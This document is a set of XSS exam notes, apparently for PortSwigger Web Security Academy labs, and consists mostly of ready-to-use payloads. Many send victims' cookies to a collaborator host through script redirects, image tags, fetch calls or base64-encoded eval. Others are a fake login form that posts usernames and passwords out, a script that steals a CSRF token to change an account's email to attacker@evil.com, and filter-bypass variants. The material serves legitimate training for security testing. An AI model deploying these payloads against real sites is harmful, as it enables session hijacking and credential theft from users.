## 🎯 Target Locations

### Primary Targets
1. **Search Input** ⭐⭐⭐
   - Most common XSS location
   - Always run Burp Scanner
   
2. **Comment Section** ⭐⭐
   - Stored XSS opportunity
   - May be disabled on exam

## 🔥 Essential Payloads

### 1. Basic Cookie Stealer
```html
<script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

### 2. Image-based Cookie Stealer
```html
<script>document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</script>
```

```js
<img src=x onerror="fetch('http://burp.oastify.com?c='+btoa(document.cookie))"></img>
```

### 3. Fetch-based Exfiltration
```javascript
<script>fetch('http://burp.oastify.com?c='+btoa(document.cookie))</script>
```

## 📚 Lab-Specific Payloads

### DOM XSS in document.write (Select Element)
**Context:** `storeId` parameter in product page

**Basic Payload:**
```javascript
storeId=kek"></select><script>alert(1)</script>
```

**Cookie Stealer:**
```javascript
"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

---

### AngularJS Expression XSS
**Context:** Angle brackets and quotes are HTML-encoded

**Basic Payload:**
```javascript
{{constructor.constructor('alert(1)')()}}
```

**Cookie Stealer:**
```javascript
{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
```

---

### Reflected DOM XSS
**Context:** Escaping from JavaScript string

**Basic Payload:**
```javascript
\\"-alert()}//
```

**Cookie Stealer:**
```javascript
\\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
```

---

### Stored DOM XSS (First Angle Bracket Bypass)
**Context:** Function replaces first angle brackets only

**Basic Payload:**
```html
<><img src=1 onerror=alert(1)>
```

**Cookie Stealer:**
```html
<><img src=1 onerror="window.location='http://burp.oastify.com/c='+document.cookie">
```

---

### Password Capture via XSS
**Context:** Create fake login form to capture credentials

**Basic Form:**
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('http://burp.oastify.com',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
});">
```

**With Autocomplete:**
```html
<input name="username" id="username" autocomplete="username">
<input type="password" id="password" name="password" autocomplete="password" 
  onchange="if(this.value.length)fetch('http://burp.oastify.com',{
    method:'POST',
    mode: 'no-cors',
    body:username.value+':'+this.value
  });">
```

---

### XSS to Perform CSRF
**Context:** Steal CSRF token and perform action

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();

function handleResponse() {
  var token = this.responseText.match(/name=\"csrf\" value=\"(\w+)\"/)[1];
  var changeReq = new XMLHttpRequest();
  changeReq.open('post', '/my-account/change-email', true);
  changeReq.send('csrf='+token+'&email=attacker@evil.com');
}
</script>
```

## 🛡️ Bypass Techniques

### Case Variation
```html
</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt >
```

### String.fromCharCode Encoding
```javascript
</ScRiPt ><ScRiPt >document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,34,104,116,116,112,58,47,47) + document.cookie + String.fromCharCode(34,32,47,62));</ScRiPt >
```

### Bracket Notation Bypass
```javascript
"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"
```

### Base64 Eval Bypass
```javascript
"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```
*Decodes to:* `fetch("https://burp.oastify.com/?c="+btoa(document['cookie']))`

## 🎓 Exam Tips

1. **Always use Burp Collaborator** - Replace `burp.oastify.com` with your collaborator URL
2. **Target Scan first** - Let Burp Scanner find the XSS context
3. **Adapt payloads** - Modify based on the filtering/encoding you encounter
4. **Check both search and comments** - But comments might be disabled
5. **Use exploit server** - Deliver payload to victim via exploit server

---

# DOM-based XSS

## 🎯 Overview

DOM-based XSS occurs when JavaScript code processes user input and writes it to the DOM in an unsafe way.

## 🔍 Detection

### Common Sinks
- `document.write()`
- `innerHTML`
- `outerHTML`
- `eval()`
- `setTimeout()`
- `setInterval()`

### Common Sources
- `location.search`
- `location.hash`
- `document.referrer`
- `document.cookie`
- `postMessage()`

## 🔥 Key Payloads

### 1. document.write with location.search
**Context:** Product page with `storeId` parameter

```javascript
?storeId="></select><script>alert(1)</script>
```

### 2. AngularJS Expression Injection
```javascript
{{constructor.constructor('alert(1)')()}}
```

### 3. Reflected DOM XSS
```javascript
\\"-alert()}//
```

### 4. Stored DOM XSS
```html
<><img src=1 onerror=alert(1)>
```

### 5. Web Messages XSS
```html
<iframe src="https://vulnerable-site.com/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

### 6. DOM-based Open Redirection
```javascript
?url=javascript:alert(1)
```

## 7 Redirection for reflected
```html
<script>
window.location.href = "https://0a3500e404cc43fd806f0d7800d700e5.web-security-academy.net/?SearchTerm=%22-eval(atob('ZmV0Y2goImh0dHBzOi8vbG9kdGlheWRmOTl3Ympmd3RoM3NoaTl3Y25pajZhdXoub2FzdGlmeS5jb20vP2M9IitidG9hKGRvY3VtZW50Wydjb29raWUnXSkp'))-%22%3ch1%3ea%3c%2fh1%3e"
</script>
```

## 🎓 Exam Tips

1. **Use DOM Invader** - Burp's DOM Invader extension helps identify DOM XSS
2. **Check JavaScript files** - Look for unsafe DOM manipulation
3. **Test all URL parameters** - Including hash fragments
4. **Look for postMessage** - Web messaging is a common exam topic


**Exam rule:**
- innerHTML sink → Use event handlers (`onerror`, `onload`, etc.)
- document.write sink → Script tags work
- **Never waste time trying `<script>` in innerHTML contexts**
